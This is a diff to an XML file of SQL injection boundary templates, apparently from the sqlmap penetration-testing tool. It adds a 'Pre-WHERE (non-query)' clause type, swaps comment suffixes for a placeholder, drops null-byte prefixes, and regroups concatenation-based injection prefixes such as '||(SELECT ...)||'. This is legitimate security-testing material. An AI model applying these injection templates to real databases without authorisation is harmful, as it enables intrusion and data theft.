@@ -31,6 +31,7 @@ Tag: <boundary>
             6: TOP
             7: Table name
             8: Column name
+            9: Pre-WHERE (non-query)
 
         A comma separated list of these values is also possible.
 
@@ -80,7 +81,7 @@ Formats:
         <where>1,2</where>
         <ptype>1</ptype>
         <prefix>)</prefix>
-        <suffix></suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -89,7 +90,7 @@ Formats:
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>')</prefix>
-        <suffix></suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -98,7 +99,7 @@ Formats:
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>'</prefix>
-        <suffix></suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -107,7 +108,7 @@ Formats:
         <where>1,2</where>
         <ptype>4</ptype>
         <prefix>"</prefix>
-        <suffix></suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
     <!-- End of generic boundaries -->
 
@@ -365,48 +366,12 @@ Formats:
     </boundary>
 
     <boundary>
-        <level>5</level>
-        <clause>1</clause>
-        <where>1,2</where>
-        <ptype>2</ptype>
-        <prefix>%00')</prefix>
-        <suffix> AND ('[RANDSTR]'='[RANDSTR]</suffix>
-    </boundary>
-
-    <boundary>
-        <level>5</level>
-        <clause>1</clause>
-        <where>1,2</where>
-        <ptype>2</ptype>
-        <prefix>%00'))</prefix>
-        <suffix> AND (('[RANDSTR]'='[RANDSTR]</suffix>
-    </boundary>
-
-    <boundary>
-        <level>5</level>
-        <clause>1</clause>
-        <where>1,2</where>
-        <ptype>2</ptype>
-        <prefix>%00')))</prefix>
-        <suffix> AND ((('[RANDSTR]'='[RANDSTR]</suffix>
-    </boundary>
-
-    <boundary>
-        <level>4</level>
-        <clause>1</clause>
-        <where>1,2</where>
-        <ptype>2</ptype>
-        <prefix>%00'</prefix>
-        <suffix> AND '[RANDSTR]'='[RANDSTR]</suffix>
-    </boundary>
-
-    <boundary>
         <level>1</level>
         <clause>1</clause>
         <where>1,2</where>
         <ptype>1</ptype>
         <prefix></prefix>
-        <suffix>-- [RANDSTR]</suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -422,56 +387,92 @@ Formats:
     <!-- Pre-WHERE generic boundaries (e.g. "UPDATE table SET '$_REQUEST["name"]' WHERE id=1" or "INSERT INTO table VALUES('$_REQUEST["value"]') WHERE id=1)"-->
     <boundary>
         <level>5</level>
-        <clause>1</clause>
+        <clause>9</clause>
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>') WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
         <level>5</level>
-        <clause>1</clause>
+        <clause>9</clause>
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>") WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
         <level>4</level>
-        <clause>1</clause>
+        <clause>9</clause>
         <where>1,2</where>
         <ptype>1</ptype>
         <prefix>) WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
         <level>4</level>
-        <clause>1</clause>
+        <clause>9</clause>
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>' WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
         <level>5</level>
-        <clause>1</clause>
+        <clause>9</clause>
         <where>1,2</where>
         <ptype>4</ptype>
         <prefix>" WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
         <level>4</level>
-        <clause>1</clause>
+        <clause>9</clause>
         <where>1,2</where>
         <ptype>1</ptype>
         <prefix> WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
+    </boundary>
+
+    <boundary>
+        <level>5</level>
+        <clause>9</clause>
+        <where>1</where>
+        <ptype>2</ptype>
+        <prefix>'||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]</prefix>
+        <suffix>)||'</suffix>
+    </boundary>
+
+    <boundary>
+        <level>5</level>
+        <clause>9</clause>
+        <where>1</where>
+        <ptype>2</ptype>
+        <prefix>'||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]</prefix>
+        <suffix>)||'</suffix>
+    </boundary>
+
+    <boundary>
+        <level>5</level>
+        <clause>9</clause>
+        <where>1</where>
+        <ptype>1</ptype>
+        <prefix>'+(SELECT [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
+        <suffix>)+'</suffix>
+    </boundary>
+
+    <boundary>
+        <level>5</level>
+        <clause>9</clause>
+        <where>1</where>
+        <ptype>2</ptype>
+        <prefix>'+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]</prefix>
+        <suffix>)+'</suffix>
     </boundary>
     <!-- End of pre-WHERE generic boundaries -->
 
@@ -482,7 +483,7 @@ Formats:
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -491,7 +492,7 @@ Formats:
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>")) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -500,7 +501,7 @@ Formats:
         <where>1,2</where>
         <ptype>1</ptype>
         <prefix>)) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -509,7 +510,7 @@ Formats:
         <where>1,2</where>
         <ptype>2</ptype>
         <prefix>') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -518,7 +519,7 @@ Formats:
         <where>1,2</where>
         <ptype>4</ptype>
         <prefix>") AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -527,27 +528,16 @@ Formats:
         <where>1,2</where>
         <ptype>1</ptype>
         <prefix>) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>-- </suffix>
-    </boundary>
-    <!-- End of pre-WHERE derived table boundaries -->
-
-    <!-- INSERT/UPDATE generic boundaries (e.g. "INSERT INTO table VALUES ('$_REQUEST["name"]',...)"-->
-    <boundary>
-        <level>5</level>
-        <clause>1</clause>
-        <where>1</where>
-        <ptype>2</ptype>
-        <prefix>'||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>)||'</suffix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
-        <level>5</level>
+        <level>4</level>
         <clause>1</clause>
         <where>1</where>
-        <ptype>2</ptype>
-        <prefix>'||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>)||'</suffix>
+        <ptype>1</ptype>
+        <prefix>` WHERE [RANDNUM]=[RANDNUM]</prefix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
     <boundary>
@@ -555,19 +545,10 @@ Formats:
         <clause>1</clause>
         <where>1</where>
         <ptype>1</ptype>
-        <prefix>'+(SELECT [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>)+'</suffix>
+        <prefix>`) WHERE [RANDNUM]=[RANDNUM]</prefix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
-
-    <boundary>
-        <level>5</level>
-        <clause>1</clause>
-        <where>1</where>
-        <ptype>2</ptype>
-        <prefix>'+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>)+'</suffix>
-    </boundary>
-    <!-- End of INSERT/UPDATE generic boundaries -->
+    <!-- End of pre-WHERE derived table boundaries -->
 
     <!-- AGAINST boolean full-text search boundaries (http://dev.mysql.com/doc/refman/5.5/en/fulltext-boolean.html) -->
     <boundary>
